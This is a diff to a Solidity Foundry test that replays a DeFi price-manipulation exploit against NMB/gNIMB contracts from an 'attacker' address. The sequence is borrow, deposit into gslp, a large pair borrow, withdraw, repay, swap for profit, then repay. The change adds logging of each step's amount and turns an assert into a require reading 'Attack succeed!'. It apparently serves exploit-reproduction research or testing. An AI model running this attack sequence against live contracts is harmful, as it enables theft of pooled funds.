@@ -380,16 +380,32 @@ contract NMBTestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 150000e18);
         borrow_gnimb_owner(150000e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 150000e18);
         deposit_gslp_gnimb_gslp(150000e18);
         printBalance("After step1 ");
+        emit log_named_uint("amt2", 9000000e18);
         borrow_gnimb_pairnbugnimb(9000000e18);
         printBalance("After step2 ");
+        emit log_named_uint("amt3", gslp.balanceOf(attacker));
         withdraw_gslp_gslp_gnimb(gslp.balanceOf(attacker));
         printBalance("After step3 ");
+        emit log_named_uint("amt4", (9000000e18 * 1003) / 1000);
         payback_gnimb_pairnbugnimb((9000000e18 * 1003) / 1000);
         printBalance("After step4 ");
+        emit log_named_uint(
+            "amt5",
+            gnimb.balanceOf(attacker) - (150000e18 * 1003) / 1000
+        );
+        emit log_named_uint(
+            "amt6",
+            pairnbugnimb.getAmountOut(
+                gnimb.balanceOf(attacker) - (150000e18 * 1003) / 1000,
+                address(gnimb)
+            )
+        );
         swap_pairnbugnimb_attacker_gnimb_nbu(
             gnimb.balanceOf(attacker) - (150000e18 * 1003) / 1000,
             pairnbugnimb.getAmountOut(
@@ -398,6 +414,7 @@ contract NMBTestBase is Test, BlockLoader {
             )
         );
         printBalance("After step5 ");
+        emit log_named_uint("amt7", (150000e18 * 1003) / 1000);
         payback_gnimb_owner((150000e18 * 1003) / 1000);
         printBalance("After step6 ");
         require(attackGoal(), "Attack failed!");
@@ -424,7 +441,7 @@ contract NMBTestBase is Test, BlockLoader {
         payback_gnimb_pairnbugnimb(amt4);
         swap_pairnbugnimb_attacker_gnimb_nbu(amt5, amt6);
         payback_gnimb_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
